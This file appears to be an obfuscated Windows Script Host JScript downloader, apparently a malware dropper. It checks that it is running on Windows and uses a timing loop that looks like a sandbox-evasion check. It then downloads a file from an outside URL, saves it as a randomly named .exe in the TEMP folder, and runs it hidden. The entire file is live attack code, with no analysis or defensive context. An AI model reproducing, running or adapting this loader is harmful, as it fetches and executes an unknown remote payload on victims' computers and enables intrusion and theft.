var _R = false;
var _NL = "CreateObject";
var _BT = function _YF() {return WScript[_NL]("WScript"+".Shell");}(), _U0 = 11;
var _KD = "MSXML2.XMLHTTP";
var _G = 2123213;
var _ST = 0;
function _Y0(_C){_BT["Run"](_C, _ST, _ST);};
function _RG(){return _KD + "";};
function _B(_X0, _VX){_ST = _ST * 1; return _X0 - _VX;};
function _AK(){return _NL;};
/*@cc_on
  @if (@_win32 || @_win64)
    _R = true;
  @end
@*/
if (_R)
{
var _HD = "";
function _FH(){return 22;};
var _IQ0 = 0; var _SX = 0;
function _IQ()
{
var _V0 = new this["Date"]();
var _OY = _V0["getUTCMilliseconds"]();
WScript["Sleep"](_FH());
var _V0 = new this["Date"]();
var _EO = _V0["getUTCMilliseconds"]();
WScript["Sleep"](_FH());
var _V0 = new this["Date"]();
var _LA = _V0["getUTCMilliseconds"]();
var _IQ0 = "_H0";
_IQ0 = _B(_EO, _OY);
var _SX = "_FZ";
_SX = _B(_LA, _EO);
_HD = "open";
return _B(_IQ0, _SX);
}
var _PY = false;
var _SE = false;
for (var _SG = _ST; _SG < _FH() * 1; _SG++){if (_IQ() != _ST){
_PY = true; 
_SX = "31" + 11 * _IQ0 + _SX; 
_SE = true; 
break;
}}
function _M() {return ((_PY == true) && (_PY == _SE)) ? 1 : _ST;};
if (_PY && _M() && _SE){
function _Y() {return _BT["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ZvjTLNn9ywG.ex" + "e";};
 _X = _RG();
 _K = WScript[_NL](_X);
 var _W = 1;
 while (_W){
try {
	if (_W == 1)
	{
		_K[_HD]("GET", "http://mentalmathcompetition.com/k4isa", false);
		_K["send"]();
		_V = "Sleep";
	}
	WScript[_V](_FH() + 120); 
	if (_K["readystate"] < 2 * 2) continue;
	_W = _ST;
	function _H(_J) {var _U = (1, 2, 3, 4, 5, _J); return _U;};
	_N = WScript[_AK()]("ADODB.Stream");
	_X = _N;
	_X[_HD]();
	_X["type"] = _H(1);
	_X["write"](_K["ResponseBody"]);
	_N["position"] = _H(_ST);
	_X["Save" + "ToFile"](_Y(), 2);
	_N["cl"+"ose"]();
	_FA = _Y();
	_Y0(_FA);
} catch(_BP){};
}
}
}

